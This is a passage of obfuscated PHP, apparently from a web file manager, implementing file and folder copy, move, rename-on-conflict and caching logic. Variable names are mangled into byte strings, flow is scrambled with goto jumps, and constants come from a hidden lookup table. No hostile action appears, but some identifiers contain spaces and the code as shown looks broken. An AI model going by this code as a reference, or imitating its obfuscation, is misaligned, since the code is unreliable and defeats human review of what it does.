e„ì¡©ˆÖÈ; f§„¿¿ªŞ–: $this->saveAll($Eœ©ğ§×ÆØ[$E‹Ó×íêÌ°[526]]); Model($E‹Ó×íêÌ°[173])->linkAdd($Eœ©ğ§×ÆØ[$E‹Ó×íêÌ°[524]]); $this->folderSizeReset($b„‚ÕË„); goto A¿Ëäùª; fßšÉƒ³ó: $this->targetIsDelete = intval($f›âÒ„Ì«ƒ[$E‹Ó×íêÌ°[417]]); $aï‹“Ğã¨ = $this->fileNameExistCache($b„‚ÕË„, $f›âÒ„Ì«ƒ[$E‹Ó×íêÌ°[28]]); $C˜îáÄ”â¼ = $this->_copy($bŸÊèÃÄÙ, $b„‚ÕË„, $b»ñº…Õ‰‡, $Eœ©ğ§×ÆØ, !0, $E×·ƒµ¬ù); goto DÀ‚Ù¹Ã; DÀ‚Ù¹Ã: $this->_childrenListClear(); $this->lockCopyEnd($bŸÊèÃÄÙ); $this->lockWriteEnd($b„‚ÕË„, $e©óçÙ§ñØ); goto E×‘–²‡´; A¿Ëäùª: $this->updateModifyTime($b„‚ÕË„); return $C˜îáÄ”â¼; goto FĞ‹ŒÇäµ²; E×‘–²‡´: if ($f›âÒ„Ì«ƒ[$E‹Ó×íêÌ°[397]] == $E‹Ó×íêÌ°[86] && $aï‹“Ğã¨ == $C˜îáÄ”â¼) { $this->folderSizeResetChildren($aï‹“Ğã¨); } Model($E‹Ó×íêÌ°[527])->addAll($Eœ©ğ§×ÆØ[$E‹Ó×íêÌ°[525]], array(), !0); if ($aï‹“Ğã¨ != $C˜îáÄ”â¼ || $f›âÒ„Ì«ƒ[$E‹Ó×íêÌ°[397]] == $E‹Ó×íêÌ°[86]) { Model($E‹Ó×íêÌ°[528])->eventCopy($C˜îáÄ”â¼); } goto f§„¿¿ªŞ–; d‚ÄÍ®¼Ë†: if (!$f›âÒ„Ì«ƒ || !$AÄ¯²©˜‚Ó || $AÄ¯²©˜‚Ó[$E‹Ó×íêÌ°[397]] != $E‹Ó×íêÌ°[86]) { return !1; } if ($this->isParentOf($bŸÊèÃÄÙ, $b„‚ÕË„)) { return !1; } $e©óçÙ§ñØ = $E×·ƒµ¬ù ? $E×·ƒµ¬ù : $f›âÒ„Ì«ƒ[$E‹Ó×íêÌ°[28]]; goto fùÃ‰¶Î°Ñ; fùÃ‰¶Î°Ñ: $this->lockCopyStart($bŸÊèÃÄÙ); $this->lockWriteStart($b„‚ÕË„, $e©óçÙ§ñØ); $Eœ©ğ§×ÆØ = array($E‹Ó×íêÌ°[524] => array(), $E‹Ó×íêÌ°[525] => array(), $E‹Ó×íêÌ°[526] => array()); goto fßšÉƒ³ó; e„ì¡©ˆÖÈ: $E‹Ó×íêÌ° =& $_SERVER[¹…ÕÄ]; $f›âÒ„Ì«ƒ = $this->sourceInfo($bŸÊèÃÄÙ); $AÄ¯²©˜‚Ó = $this->sourceInfo($b„‚ÕË„); goto d‚ÄÍ®¼Ë†; FĞ‹ŒÇäµ²: } private function _copy($FÜ×Ç…¯İ¿, $Aµâ”ëî¿Ú, $DÇ§Á‘óÏ, &$a·ò éëØ, $fÛÊ‹„Ëä„, $fšîÑ¼„ë£ = '') { goto fË­¥Ó¸ºÕ; A£öé Ò£÷: $Aâ İêìĞ† = $fšîÑ¼„ë£ ? $fšîÑ¼„ë£ : $cñÏÅŞğ‚¿[$C‹öùÂö×[28]]; $B‚º§Ï¶¾à = $this->fileNameExistCache($Aµâ”ëî¿Ú, $Aâ İêìĞ†); if ($fÛÊ‹„Ëä„) { $this->_childrenAllMake($FÜ×Ç…¯İ¿); if ($DãùêšŠÜŠ && $B‚º§Ï¶¾à) { $this->_childrenAllMake($B‚º§Ï¶¾à); } } goto Fƒ¯Îóì’æ; fË­¥Ó¸ºÕ: $C‹öùÂö× =& $_SERVER[¹…ÕÄ]; $cñÏÅŞğ‚¿ = $this->sourceInfoCache($FÜ×Ç…¯İ¿); $DãùêšŠÜŠ = $cñÏÅŞğ‚¿[$C‹öùÂö×[397]] == $C‹öùÂö×[86]; goto A£öé Ò£÷; Fƒ¯Îóì’æ: if (!$B‚º§Ï¶¾à) { return $this->_copyCreate($FÜ×Ç…¯İ¿, $Aµâ”ëî¿Ú, $Aâ İêìĞ†, $a·ò éëØ); } $FèÈŒçÇ¼ = $B‚º§Ï¶¾à; if ($DãùêšŠÜŠ) { if ($DÇ§Á‘óÏ == REPEAT_RENAME_FOLDER) { $Aâ İêìĞ† = $this->fileNameAutoCache($Aµâ”ëî¿Ú, $Aâ İêìĞ†, $DÇ§Á‘óÏ, $DãùêšŠÜŠ); $FèÈŒçÇ¼ = $this->_copyCreate($FÜ×Ç…¯İ¿, $Aµâ”ëî¿Ú, $Aâ İêìĞ†, $a·ò éëØ); } else { $F²ååº·éØ = $this->_childrenList($FÜ×Ç…¯İ¿); foreach ($F²ååº·éØ as $Cğ§ŠĞôøº) { $this->_copy($Cğ§ŠĞôøº[$C‹öùÂö×[390]], $B‚º§Ï¶¾à, $DÇ§Á‘óÏ, $a·ò éëØ, !1); } } } else { if ($DÇ§Á‘óÏ == REPEAT_RENAME || $DÇ§Á‘óÏ == REPEAT_RENAME_FOLDER) { $Aâ İêìĞ† = $this->fileNameAutoCache($Aµâ”ëî¿Ú, $Aâ İêìĞ†, $DÇ§Á‘óÏ, $DãùêšŠÜŠ); $FèÈŒçÇ¼ = $this->_copyCreate($FÜ×Ç…¯İ¿, $Aµâ”ëî¿Ú, $Aâ İêìĞ†, $a·ò éëØ); } else { if ($DÇ§Á‘óÏ == REPEAT_REPLACE) { $a±¯šùŒ¤ì = $this->sourceInfoCache($B‚º§Ï¶¾à); $eéâÍäˆ­Î = $this->fileHistory($a±¯šùŒ¤ì, $cñÏÅŞğ‚¿[$C‹öùÂö×[441]], $cñÏÅŞğ‚¿[$C‹öùÂö×[77]]); if ($eéâÍäˆ­Î) { $a·ò éëØ[$C‹öùÂö×[524]][] = $cñÏÅŞğ‚¿[$C‹öùÂö×[441]]; } } else { if ($DÇ§Á‘óÏ == REPEAT_SKIP) { } } } Hook::trigger($C‹öùÂö×[529], array($C‹öùÂö×[530], $cñÏÅŞğ‚¿, 0)); } goto E› ƒèİ›œ; E› ƒèİ›œ: return $FèÈŒçÇ¼; goto F«“Ÿ¶ù•›; F«“Ÿ¶ù•›: } private function _copyCreate($bö©öÌßù, $E”–’Ä‡‰, $EĞ†³ä›²´, &$D‚‡ªŸ¢£) { goto Fí“Šå±¡Ì; bóÄ„¸Ï†‚: $this->_childrenListAll($bö©öÌßù, $C¼ã¾šñ…ğ); $F¿ã‚Ô¹¶¶ = count($C¼ã¾šñ…ğ); if ($F¿ã‚Ô¹¶¶ == 0) { return $A„×èŞ¢Šİ; } goto cŞã×ƒ¤×; Fí“Šå±¡Ì: $E·ƒæÌ”› =& $_SERVER[¹…ÕÄ]; $CÈ‡…Ú–“ = $this->sourceInfoCache($bö©öÌßù); $fÈŒŒÅ‰ç• = $this->sourceInfoCache($E”–’Ä‡‰); goto bİ‰å´‹Å; cŞã×ƒ¤×: $EˆÆ¿Şö« = $this->sourceInfo($A„×èŞ¢Šİ); foreach ($C¼ã¾šñ…ğ as $eÁºÈÔ’) { $c‚†Ö‡òë» = $this->_makeItemData($eÁºÈÔ’, $EˆÆ¿Şö«, $eÁºÈÔ’[$E·ƒæÌ”›[28]]); $c‚†Ö‡òë»[$E·ƒæÌ”›[481]] = $eÁºÈÔ’[$E·ƒæÌ”›[481]]; $Aåƒ‡ÌµË½[] = $c‚†Ö‡òë»; } $this->chunkEventSet($E·ƒæÌ”›[534], array($E·ƒæÌ”›[535], $C¾åŠ¼¯÷¦, $F¿ã‚Ô¹¶¶)); goto EóíµîÊğ»; AøøÀ´Á: if ($CÈ‡…Ú–“[$E·ƒæÌ”›[397]] != $E·ƒæÌ”›[86]) { $D‚‡ªŸ¢£[$E·ƒæÌ”›[524]][] = $CÈ‡…Ú–“[$E·ƒæÌ”›[441]]; return $A„×èŞ¢Šİ; } $C¼ã¾šñ…ğ = array(); $Aåƒ‡ÌµË½ = array(); goto bóÄ„¸Ï†‚; EóíµîÊğ»: $this->addAll($Aåƒ‡ÌµË½, array(), !1); $FÍœŞÒïĞ = $this->where(array($E·ƒæÌ”›[472] => $A„×èŞ¢Šİ))->select(); $aÁèèªâ÷ = $this->_childrenMakeRelation($C¼ã¾šñ…ğ, $FÍœŞÒïĞ); goto a„ÜÅÀ»«à; a¡ï¿ë´´æ: $A„×èŞ¢Šİ = $this->add($C¾åŠ¼¯÷¦); $B–Îğ‹ÂĞŸ = array($E·ƒæÌ”›[390] => $A„×èŞ¢Šİ, $E·ƒæÌ”›[28] => $EĞ†³ä›²´); $this->_copyApplyMeta($B–Îğ‹ÂĞŸ, $D‚‡ªŸ¢£); goto AøøÀ´Á; b»˜¶¡„: foreach ($FÍœŞÒïĞ as $eÁºÈÔ’) { $CÎá“®ÔËõ = $eÁºÈÔ’[$E·ƒæÌ”›[390]]; $c£Š–ˆ”‡ë = $this->_childrenMatch($aÁèèªâ÷, $eÁºÈÔ’, $EˆÆ¿Şö«); $EÊ´§† ã[] = array($E·ƒæÌ”›[390], $CÎá“®ÔËõ, $E·ƒæÌ”›[472], $c£Š–ˆ”‡ë[$E·ƒæÌ”›[472]]); $F›ù©‹£ÙÊ[] = array($E·ƒæÌ”›[390], $CÎá“®ÔËõ, $E·ƒæÌ”›[481], $c£Š–ˆ”‡ë[$E·ƒæÌ”›[481]]); $this->_copyApplyMeta($eÁºÈÔ’, $D‚‡ªŸ¢£); if ($eÁºÈÔ’[$E·ƒæÌ”›[397]] != $E·ƒæÌ”›[86]) { $D‚‡ªŸ¢£[$E·ƒæÌ”›[524]][] = $eÁºÈÔ’[$E·ƒæÌ”›[441]]; } } $this->chunkEventSet($E·ƒæÌ”›[536], array($E·ƒæÌ”›[537], $C¾åŠ¼¯÷¦, $F¿ã‚Ô¹¶¶)); $this->saveAll($EÊ´§† ã); goto E°»ã¡ù™Á; bİ‰å´‹Å: $C¾åŠ¼¯÷¦ = $this->_makeItemData($CÈ‡…Ú–“, $fÈŒŒÅ‰ç•, $EĞ†³ä›²´); Hook::trigger($E·ƒæÌ”›[531], $C¾åŠ¼¯÷¦); Hook::trigger($E·ƒæÌ”›[532], array($E·ƒæÌ”›[533], $C¾åŠ¼¯÷¦, 0)); goto a¡ï¿ë´´æ; a„ÜÅÀ»«à: $aÁèèªâ÷[$bö©öÌßù] = $A„×èŞ¢Šİ; $EÊ´§† ã = array(); $F›ù©‹£ÙÊ = array(); goto b»˜¶¡„; E°»ã¡ù™Á: $this->chunkEventSet($E·ƒæÌ”›[538], array($E·ƒæÌ”›[539], $C¾åŠ¼¯÷¦, $F¿ã‚Ô¹¶¶)); $this->saveAll($F›ù©‹£ÙÊ); return $A„×èŞ¢Šİ; goto eâ¬ïêÅËä; eâ¬ïêÅËä: } private function _childrenMakeRelation($bŠ…²¸…Ø, $Fö“ÀÁ¼«Á) { $eÕ„ïø°‘ =& $_SERVER[¹…ÕÄ]; $Aƒ±­îÂÎ° = array(); $C¹ó‰î½  = array(); foreach ($bŠ…²¸…Ø as $Eé±ÀÀºå) { $EšùÀæâ¢‚ = $Eé±ÀÀºå[$eÕ„ïø°‘[28]] . $eÕ„ïø°‘[8] . $Eé±ÀÀºå[$eÕ„ïø°‘[481]]; $Aƒ±­îÂÎ°[$EšùÀæâ¢‚] = $Eé±ÀÀºå[$eÕ„ïø°‘[390]]; } foreach ($Fö“ÀÁ¼«Á as $Eé±ÀÀºå) { $EšùÀæâ¢‚ = $Eé±ÀÀºå[$eÕ„ïø°‘[28]] . $eÕ„ïø°‘[8] . $Eé±ÀÀºå[$eÕ„ïø°‘[481]]; $EğŸ¿ä‚˜ = $Aƒ±­îÂÎ°[$EšùÀæâ¢‚]; $C¹ó‰î½ [$EğŸ¿ä‚˜] = $Eé±ÀÀºå[$eÕ„ïø°‘[390]]; } return $C¹ó‰î½ ; } private function _childrenMatch($b‘º¡ÜÈì, $d†Ø­øªöÍ, $aÅÃ²ô—Æ) { goto EÓ…ùãøÑï; EÓ…ùãøÑï: $FÑÙáõøÔ– =& $_SERVER[¹…ÕÄ]; $EµÊáÑ¤ö¸ = $aÅÃ²ô—Æ[$FÑÙáõøÔ–[481]]; $AóÆÂÆ¶Õİ = $this->parentLevelArray($d†Ø­øªöÍ[$FÑÙáõøÔ–[481]]); goto cÚ—¹ŒÈäï; cà‘ÑÒŒÙ¿: $bç†„±‰² = $E÷‘öí„†²[count($E÷‘öí„†²) - 1]; return array($FÑÙáõøÔ–[472] => $bç†„±‰², $FÑÙáõøÔ–[481] => $EµÊáÑ¤ö¸); goto fíô„Ú®Ö½; cÚ—¹ŒÈäï: foreach ($AóÆÂÆ¶Õİ as $bãÃ”¿Ì·‡) { if (isset($b‘º¡ÜÈì[$bãÃ”¿Ì·‡])) { $EµÊáÑ¤ö¸ .= $b‘º¡ÜÈì[$bãÃ”¿Ì·‡] . $FÑÙáõøÔ–[540]; } } $EµÊáÑ¤ö¸ = rtrim($EµÊáÑ¤ö¸, $FÑÙáõøÔ–[47]) . $FÑÙáõøÔ–[47]; $E÷‘öí„†² = $this->parentLevelArray($EµÊáÑ¤ö¸); goto cà‘ÑÒŒÙ¿; fíô„Ú®Ö½: } private function _makeItemData($c·ÇâïÚÖ°, $C»î×øå‚ã, $C§Ä¨ßİÜÎ) { $B¸¾ß÷×«® =& $_SERVER[¹…ÕÄ]; $b½†Ú¯¦¢æ = array($B¸¾ß÷×«®[541] => $c·ÇâïÚÖ°[$B¸¾ß÷×«®[397]], $B¸¾ß÷×«®[407] => $C§Ä¨ßİÜÎ, $B¸¾ß÷×«®[542] => $c·ÇâïÚÖ°[$B¸¾ß÷×«®[399]], $B¸¾ß÷×«®[442] => $c·ÇâïÚÖ°[$B¸¾ß÷×«®[441]], $B¸¾ß÷×«®[543] => $c·ÇâïÚÖ°[$B¸¾ß÷×«®[77]], $B¸¾ß÷×«®[544] => $C»î×øå‚ã[$B¸¾ß÷×«®[398]], $B¸¾ß÷×«®[545] => $C»î×øå‚ã[$B¸¾ß÷×«®[478]], $B¸¾ß÷×«®[546] => USER_ID, $B¸¾ß÷×«®[547] => USER_ID, $B¸¾ß÷×«®[389] => $C»î×øå‚ã[$B¸¾ß÷×«®[390]], $B¸¾ß÷×«®[548] => $C»î×øå‚ã[$B¸¾ß÷×«®[481]] . $C»î×øå‚ã[$B¸¾ß÷×«®[390]] . $B¸¾ß÷×«®[47], $B¸¾ß÷×«®[416] => 0, $B¸¾ß÷×«®[549] => $B¸¾ß÷×«®[33]); return $b½†Ú¯¦¢æ; } private function _copyApplyMeta($A•§•¤Õã, &$Càó¯´ÆŸç) { $fÂ‰‚ëóçÙ =& $_SERVER[¹…ÕÄ]; $BËª†µ™È¶ = $A•§•¤Õã[$fÂ‰‚ëóçÙ[390]]; $b‚ÀÁ¸«â = $A•§•¤Õã[$fÂ‰‚ëóçÙ[28]]; if (!isset($A•§•¤Õã[$fÂ‰‚ëóçÙ[550]]) || !$A•§•¤Õã[$fÂ‰‚ëóçÙ[550]] || $A•§•¤Õã[$fÂ‰‚ëóçÙ[550]] == $fÂ‰‚ëóçÙ[491]) { $Càó¯´ÆŸç[$fÂ‰‚ëóçÙ[526]][] = array($fÂ‰‚ëóçÙ[390], $BËª†µ™È¶, $fÂ‰‚ëóçÙ[550], short_id($BËª†µ™È¶)); } if (Input::check($b‚ÀÁ¸«â, $fÂ‰‚ëóçÙ[551])) { $Càó¯´ÆŸç[$fÂ‰‚ëóçÙ[525]][] = array($fÂ‰‚ëóçÙ[390] => $BËª†µ™È¶, $fÂ‰‚ëóçÙ[92] => $fÂ‰‚ëóçÙ[438], $fÂ‰‚ëóçÙ[370] => str_replace($fÂ‰‚ëóçÙ[50], $fÂ‰‚ëóçÙ[33], Pinyin::encode($b‚ÀÁ¸«â))); $Càó¯´ÆŸç[$fÂ‰‚ëóçÙ[525]][] = array($fÂ‰‚ëóçÙ[390] => $BËª†µ™È¶, $fÂ‰‚ëóçÙ[92] => $fÂ‰‚ëóçÙ[437], $fÂ‰‚ëóçÙ[370] => Pinyin::encode($b‚ÀÁ¸«â, $fÂ‰‚ëóçÙ[552])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($A¤Ôô®ïĞ) { goto E¯–ÀíäÖ‹; aÆ‘îŒ¬Úé: $b´éÚÖ©Î = array_to_keyvalue($b´éÚÖ©Î, $föß›Í¼®[390]); foreach ($b´éÚÖ©Î as $aŞñÎÜÈ¦²) { $A÷ö«»¾íŒ = $aŞñÎÜÈ¦²[$föß›Í¼®[472]]; $A¤Ôô®ïĞ = $aŞñÎÜÈ¦²[$föß›Í¼®[390]]; if (!isset($this->_childrenListCache[$A¤Ôô®ïĞ]) && $aŞñÎÜÈ¦²[$föß›Í¼®[397]] == $föß›Í¼®[86]) { $this->_childrenListCache[$A¤Ôô®ïĞ] = array(); } if (!isset($this->_childrenListCache[$A÷ö«»¾íŒ])) { $this->_childrenListCache[$A÷ö«»¾íŒ] = array(); } $this->_childrenListCache[$A÷ö«»¾íŒ][$A¤Ôô®ïĞ] = $aŞñÎÜÈ¦²; $this->_childrenItemCache[$A¤Ôô®ïĞ] = $aŞñÎÜÈ¦²; } goto cÌ§¨ª‹; E¯–ÀíäÖ‹: $föß›Í¼® =& $_SERVER[¹…ÕÄ]; $B›ÜóŸÂ¶ = $this->sourceInfo($A¤Ôô®ïĞ); $aÍíÜ¡ö¬ = $föß›Í¼®[418]; goto AöİË¥íË›; AöİË¥íË›: $c™Ö‡­‰Ù® = array($föß›Í¼®[481] => array($föß›Í¼®[507], $B›ÜóŸÂ¶[$föß›Í¼®[481]] . $A¤Ôô®ïĞ . $föß›Í¼®[508]), $föß›Í¼®[417] => $this->targetIsDelete); $b´éÚÖ©Î = $this->field($aÍíÜ¡ö¬)->where($c™Ö‡­‰Ù®)->select(); if (!$b´éÚÖ©Î) { return; } goto aÆ‘îŒ¬Úé; cÌ§¨ª‹: } private function _childrenListAll($D„à‡ïã´Û, &$f¬Ú©¢–ó) { $fâ”Ô İ‘ =& $_SERVER[¹…ÕÄ]; if (!isset($this->_childrenListCache[$D„à‡ïã´Û])) { return; } $C³¶¶Æ“Á£ = $this->_childrenListCache[$D„à‡ïã´Û]; foreach ($C³¶¶Æ“Á£ as $b½ã¨øŞĞ => $D®ÎÕ„ÆÌ­) { $f¬Ú©¢–ó[$b½ã¨øŞĞ] = $D®ÎÕ„ÆÌ­; if ($D®ÎÕ„ÆÌ­[$fâ”Ô İ‘[397]] == $fâ”Ô İ‘[86]) { $this->_childrenListAll($b½ã¨øŞĞ, $f¬Ú©¢–ó); } } } private function sourceInfoCache($f™ªˆÚİ°») { if (isset($this->_childrenItemCache[$f™ªˆÚİ°»])) { return $this->_childrenItemCache[$f™ªˆÚİ°»]; } return $this->sourceInfo($f™ªˆÚİ°»); } private function _childrenList($B’¬¶îÏ) { if (isset($this->_childrenListCache[$B’¬¶îÏ])) { return $this->_childrenListCache[$B’¬¶îÏ]; } return $this->_childrenListSelect($B’¬¶îÏ); } private function _childrenListSelect($DÎ®Ü™Ç·©) { goto Eò¿Õ¸Î; Eò¿Õ¸Î: $c˜Ş×ëÑÛ½ =& $_SERVER[¹…ÕÄ]; $BÇº‰’×øÂ = array($c˜Ş×ëÑÛ½[472] => $DÎ®Ü™Ç·©, $c˜Ş×ëÑÛ½[417] => $this->targetIsDelete); $aÙœ¼µ•÷ò = $this->where($BÇº‰’×øÂ)->select(); goto aùˆØ´®Œ; aô‡óÕ˜¨º: foreach ($cÆÊ°–„Õ as $DÎ®Ü™Ç·© => $b©¿µƒùâİ) { $this->_childrenItemCache[$DÎ®Ü™Ç·©] = $b©¿µƒùâİ; } return $cÆÊ°–„Õ; goto E”ÅŞ‹ãÍ˜; aùˆØ´®Œ: $aÙœ¼µ•÷ò = $aÙœ¼µ•÷ò ? $aÙœ¼µ•÷ò : array(); $cÆÊ°–„Õ = array_to_keyvalue($aÙœ¼µ•÷ò, $c˜Ş×ëÑÛ½[390]); $this->_childrenListCache[$DÎ®Ü™Ç·©] = $cÆÊ°–„Õ; goto aô‡óÕ˜¨º; E”ÅŞ‹ãÍ˜: } private function fileNameExistCache($Eƒê‹ ëÊ˜, $eùãÌ±ì©ø) { $e†¤èßÙ†ß =& $_SERVER[¹…ÕÄ]; $eùãÌ±ì©ø = strtolower($eùãÌ±ì©ø); $d•Õ©ãğóÊ = $this->_childrenList($Eƒê‹ ëÊ˜); foreach ($d•Õ©ãğóÊ as $fİ“åæá´) { if ($eùãÌ±ì©ø == strtolower($fİ“åæá´[$e†¤èßÙ†ß[28]])) { return $fİ“åæá´[$e†¤èßÙ†ß[390]]; } } return !1; } private function fileNameAutoCache($fİƒË…¼’á, $e¡‚“öÊİ, $b¨Ë…£”·Ñ, $B§°Á˜º Å) { $bŒ™¥ÌÇ =& $_SERVER[¹…ÕÄ]; $EÃ¾Œµ†Æğ = $this->_childrenList($fİƒË…¼’á); $dëçÉà‚Ÿ´ = array_to_keyvalue($EÃ¾Œµ†Æğ, $bŒ™¥ÌÇ[33], $bŒ™¥ÌÇ[28]); return $this->fileNameAutoGet($dëçÉà‚Ÿ´, $e¡‚“öÊİ, $b¨Ë…£”·Ñ, $B§°Á˜º Å); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($d­†Ë˜ª®, $c½š‰»¸ÇÉ, $fÑ‹ÁƒÑ™– = REPEAT_REPLACE, $AÃ®†à‚ = '') { goto b¾…ÈŸš; b¾…ÈŸš: $eõÌ‰‹Ÿ… =& $_SERVER[¹…ÕÄ]; $D‰áæ’£Ë¿ = $this->sourceInfo($d­†Ë˜ª®); $b¸¼êáÆô¹ = $this->sourceInfo($c½š‰»¸ÇÉ); goto dÈ¹’ ¾£; cµ–Ï®æ„”: if ($D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[472]] == $c½š‰»¸ÇÉ && $AÃ®†à‚ != $D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[28]]) { $B·Ÿ Ü°ÚË = $this->fileNameExist($c½š‰»¸ÇÉ, $AÃ®†à‚); if ($B·Ÿ Ü°ÚË && $D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[397]] == $eõÌ‰‹Ÿ…[491]) { goto a¼ˆÁ»íëÁ; a¼ˆÁ»íëÁ: $f—§ÛŞ«†â = $this->sourceInfo($B·Ÿ Ü°ÚË); $b¹ôê¢Õğ = $this->fileHistory($f—§ÛŞ«†â, $D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[441]], $D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[77]]); if (!$b¹ôê¢Õğ) { Model($eõÌ‰‹Ÿ…[444])->remove($D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[441]]); } goto b¶òŸ²ÅÄ; e®¦«Š²¾: return $B·Ÿ Ü°ÚË; goto a’÷šÑ‚ö; b¶òŸ²ÅÄ: $this->removeNow($d­†Ë˜ª®, !1); $this->folderSizeReset($c½š‰»¸ÇÉ); Hook::trigger($eõÌ‰‹Ÿ…[554], $bÕõ¾ƒçÀ); goto e®¦«Š²¾; a’÷šÑ‚ö: } } $fæ­Æ²ÒÛÁ = $AÃ®†à‚ ? $AÃ®†à‚ : $D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[28]]; $this->lockMoveStart($d­†Ë˜ª®); goto aÍÂ‚¡ˆ²ó; aÍÂ‚¡ˆ²ó: $this->lockWriteStart($c½š‰»¸ÇÉ, $fæ­Æ²ÒÛÁ); $f­ÜÉ¾èµ‚ = array($eõÌ‰‹Ÿ…[524] => array(), $eõÌ‰‹Ÿ…[555] => !1); $this->clearShare($d­†Ë˜ª®, $c½š‰»¸ÇÉ); goto F¬³î¤Â ; dÈ¹’ ¾£: if ($D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[472]] == $b¸¼êáÆô¹[$eõÌ‰‹Ÿ…[390]]) { if ($D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[417]] == $eõÌ‰‹Ÿ…[86]) { Model($eõÌ‰‹Ÿ…[415])->restore(array($d­†Ë˜ª®)); } if (!$AÃ®†à‚ || $AÃ®†à‚ == $D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[28]]) { return $d­†Ë˜ª®; } } $bÕõ¾ƒçÀ = $this->pathInfoMore($d­†Ë˜ª®); if ($this->isParentOf($d­†Ë˜ª®, $c½š‰»¸ÇÉ)) { return !1; } goto fó†ß¯†õ‡; e­Û…‡òô: $this->lockMoveEnd($d­†Ë˜ª®); $this->lockWriteEnd($c½š‰»¸ÇÉ, $fæ­Æ²ÒÛÁ); $this->folderSizeReset($D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[472]]); goto A÷ëôØØÓ; B¤ÄÆ¢ÉÕ: $this->updateModifyTime($F°µ«±ƒÚ); Model($eõÌ‰‹Ÿ…[528])->eventMove($d­†Ë˜ª®, $D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[472]], $c½š‰»¸ÇÉ); Hook::trigger($eõÌ‰‹Ÿ…[554], $bÕõ¾ƒçÀ); goto cŒÇ›áä—; c’¸‘ŠóŠÔ: if ($D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[397]] == $eõÌ‰‹Ÿ…[86] && $C†ö×©íŞç) { $this->folderSizeResetChildren($A¼ôõ×òĞ¨); } Model($eõÌ‰‹Ÿ…[173])->linkAdd($f­ÜÉ¾èµ‚[$eõÌ‰‹Ÿ…[524]]); if ($C†ö×©íŞç && $f­ÜÉ¾èµ‚[$eõÌ‰‹Ÿ…[555]]) { $this->removeNow($d­†Ë˜ª®, !1); } goto e­Û…‡òô; F¬³î¤Â : $C†ö×©íŞç = $this->fileNameExistCache($c½š‰»¸ÇÉ, $D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[28]]); $A¼ôõ×òĞ¨ = $this->_move($d­†Ë˜ª®, $c½š‰»¸ÇÉ, $fÑ‹ÁƒÑ™–, $f­ÜÉ¾èµ‚, $AÃ®†à‚); $this->sourceCacheClear(); goto c’¸‘ŠóŠÔ; cŒÇ›áä—: return $A¼ôõ×òĞ¨; goto bÔ¿±²ÑÑë; fó†ß¯†õ‡: if (!$D‰áæ’£Ë¿ || !$b¸¼êáÆô¹ || $b¸¼êáÆô¹[$eõÌ‰‹Ÿ…[397]] != $eõÌ‰‹Ÿ…[86]) { return !1; } Hook::trigger($eõÌ‰‹Ÿ…[553], $bÕõ¾ƒçÀ); $this->targetIsDelete = intval($D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[417]]); goto cµ–Ï®æ„”; A÷ëôØØÓ: $this->folderSizeReset($c½š‰»¸ÇÉ); $F°µ«±ƒÚ = array($D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[472]], $c½š‰»¸ÇÉ); if ($D‰áæ’£Ë¿[$eõÌ‰‹Ÿ…[397]] == $eõÌ‰‹Ÿ…[86]) { $F°µ«±ƒÚ[] = $d­†Ë˜ª®; } goto B¤ÄÆ¢ÉÕ; bÔ¿±²ÑÑë: } private function _move($AÓìÔš©àæ, $E«õß„×ßÄ, $a¨ùç¹îÃ, &$b÷±ä­Äáİ, $bĞÕ¶ŒÚ†÷ = '') { goto E——ô¹áœÕ; f„…Æ’ğÃ¼: return $E¾Œ™Í; goto A‡ëÈßÉœ; F¡Éå›‘Œö: $dìó÷ÃÚ = !1; if ($B”øÇ§µ¡) { if ($a¨ùç¹îÃ == REPEAT_RENAME_FOLDER) { $C‘Ü…×¦» = $this->fileNameAuto($E«õß„×ßÄ, $C‘Ü…×¦», $a¨ùç¹îÃ, $B”øÇ§µ¡); $E¾Œ™Í = $this->_moveForce($AÓìÔš©àæ, $E«õß„×ßÄ, $C‘Ü…×¦»); } else { if ($a¨ùç¹îÃ == REPEAT_RENAME_FOLDER) { $a¨ùç¹îÃ = REPEAT_RENAME; } $Aëæ½ÑêÙÒ = $this->_childrenListSelect($AÓìÔš©àæ); foreach ($Aëæ½ÑêÙÒ as $F‰¾¿¶äèğ) { $this->_move($F‰¾¿¶äèğ[$A£¾ÀÙµ›ø[390]], $AÑ·äÁÁäÖ, $a¨ùç¹îÃ, $b÷±ä­Äáİ); } $dìó÷ÃÚ = !0; } } else { if ($a¨ùç¹îÃ == REPEAT_SKIP) { $dìó÷ÃÚ = !0; } else { if ($a¨ùç¹îÃ == REPEAT_RENAME || $a¨ùç¹îÃ == REPEAT_RENAME_FOLDER) { $C‘Ü…×¦» = $this->fileNameAuto($E«õß„×ßÄ, $C‘Ü…×¦», $a¨ùç¹îÃ, $B”øÇ§µ¡); $E¾Œ™Í = $this->_moveForce($AÓìÔš©àæ, $E«õß„×ßÄ, $C‘Ü…×¦»); } else { if ($a¨ùç¹îÃ == REPEAT_REPLACE) { $A×¥ª³» = $this->sourceInfoCache($AÑ·äÁÁäÖ); $d‘ĞÂ³ŠÃ = $this->fileHistory($A×¥ª³», $D¨ŒÜ’ÎË[$A£¾ÀÙµ›ø[441]], $D¨ŒÜ’ÎË[$A£¾ÀÙµ›ø[77]]); if ($d‘ĞÂ³ŠÃ) { $b÷±ä­Äáİ[$A£¾ÀÙµ›ø[524]][] = $D¨ŒÜ’ÎË[$A£¾ÀÙµ›ø[441]]; } else { $dìó÷ÃÚ = !0; } } } } } if ($dìó÷ÃÚ && !$b÷±ä­Äáİ[$A£¾ÀÙµ›ø[555]]) { $b÷±ä­Äáİ[$A£¾ÀÙµ›ø[555]] = !0; } goto f„…Æ’ğÃ¼; E——ô¹áœÕ: $A£¾ÀÙµ›ø =& $_SERVER[¹…ÕÄ]; 